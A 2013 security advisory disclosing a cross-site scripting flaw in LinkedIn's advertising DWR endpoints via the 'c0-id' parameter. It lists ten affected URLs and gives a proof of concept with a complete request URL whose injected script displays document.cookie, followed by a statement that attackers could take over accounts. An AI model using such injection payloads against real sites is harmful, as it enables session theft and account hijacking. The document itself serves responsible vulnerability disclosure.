Subject: [ISecAuditors Security Advisories] XSS vulnerability in LinkedIn

=============================================
INTERNET SECURITY AUDITORS ALERT 2013-003
- Original release date: March 3rd, 2013
- Last revised: March 10th, 2013
- Discovered by: Vicente Aguilera Diaz
- Severity: 4.3/10 (CVSSv2 Base Score)
=============================================

I. VULNERABILITY
-------------------------
XSS vulnerability in LinkedIn.

II. BACKGROUND
-------------------------
LinkedIn is a social networking service and website (www.linkedin.com)
for professionals. The site officially launched on May 5, 2003. As of
September 30,

2012 (the end of the third quarter), professionals are signing up to
join LinkedIn at a rate of approximately two new members per second.
Actually, Over 200

million professionals use LinkedIn to exchange information, ideas and
opportunities.

More info: http://www.linkedin.com

III. DESCRIPTION
-------------------------
Cross-Site Scripting attacks are a type of injection problem, in which
malicious scripts are injected into the otherwise benign and trusted web
sites.

Cross-site scripting (XSS) attacks occur when an attacker uses a web
application to send malicious code, generally in the form of a browser
side script, to a

different end user. Flaws that allow these attacks to succeed are quite
widespread and occur anywhere a web application uses input from a user
in the output

it generates without validating or encoding it.

An attacker can use XSS to send a malicious script to an unsuspecting
user. The end userâ€™s browser has no way to know that the script should
not be trusted,

and will execute the script. Because it thinks the script came from a
trusted source, the malicious script can access any cookies, session
tokens, or other

sensitive information retained by your browser and used with that site.
These scripts can even rewrite the content of the HTML page.

LinkedIn is vulnerable to XSS attacks during a DWR (Direct Web Remoting,
a Java open source library) call through the "c0-id" parameter. There
are several

instances of this issue:
https://www.linkedin.com/ads/dwr/exec/SasAjax.validateCreativeText.dwr
https://www.linkedin.com/ads/dwr/exec/SasAjax.getBidSuggestion.dwr
https://www.linkedin.com/ads/dwr/exec/SasAjax.validateClickThroughUrl.dwr
https://www.linkedin.com/ads/dwr/exec/SasAjax.validateCreative.dwr
https://www.linkedin.com/ads/dwr/exec/SasAjax.getCostAndMemberCount.dwr
https://www.linkedin.com/ads/dwr/exec/SasAjax.validateRequiredFields.dwr
https://www.linkedin.com/ads/dwr/exec/SasAjax.validateDisplayUrl.dwr
https://www.linkedin.com/ads/dwr/exec/SasAjax.getExampleAds.dwr
https://www.linkedin.com/ads/dwr/exec/SasAjax.changeBizAcctName.dwr
https://www.linkedin.com/ads/dwr/exec/SasAjax.updateAlertMessageId.dwr

IV. PROOF OF CONCEPT
-------------------------
Next, we show a typical request to the
"/ads/dwr/exec/SasAjax.validateCreative.dwr" resource:

POST /ads/dwr/exec/SasAjax.validateCreative.dwr HTTP/1.1
Host: www.linkedin.com
...<other-HTTP-headers>...

callCount=1
JSESSIONID=0B3F07B2742AF0F5A020AB0FB72123D9
c0-scriptName=SasAjax
c0-methodName=validateCreative
c0-id=5518_1360723319833
c0-param0=string:
c0-param1=string:
c0-param2=string:
c0-param3=string:
c0-param4=string:
c0-param5=string:
c0-param6=string:en_US
c0-param7=string:0
c0-param8=string:0
c0-param9=number:0
xml=true

Some parameters are not used/validated by the application, so we can
remove these parameters from the request. The only parameters that are
required by the

application are:
- callCount
- JSESSIONID <== can have anything value, but must match the JSESSIONID
cookie
- c0-id <== vulnerable parameter (we can inject HTML/script code through
this parameter)
- xml <== we need to change the value from "true" (default value) to
"false" to make possible the script code injection

Also, we can use HTTP GET method instead the HTTP POST method used at
this request. This makes it more easy the exploitation of the XSS
vulnerability.

For example, we can inject script code to show an alert popup with the
"document.cookie" value:
c0-id=5518_1360723319833');</SCRIPT><SCRIPT>alert(document.cookie);</SCRIPT><!--

So, finally, this HTTP request provoke the XSS exploitation::

https://www.linkedin.com/ads/dwr/exec/SasAjax.validateCreative.dwr?callCount=1&JSESSIONID=0B3F07B2742AF0F5A020AB0FB72123D9&c0-

id=5578_1362323397833');</SCRIPT><SCRIPT>alert(document.cookie);</SCRIPT><!--&xml=false

V. BUSINESS IMPACT
-------------------------
A malicious user can access to the information stored in the cookie on
other users, so the attacker can spoof they identity and access to these
user

accounts.
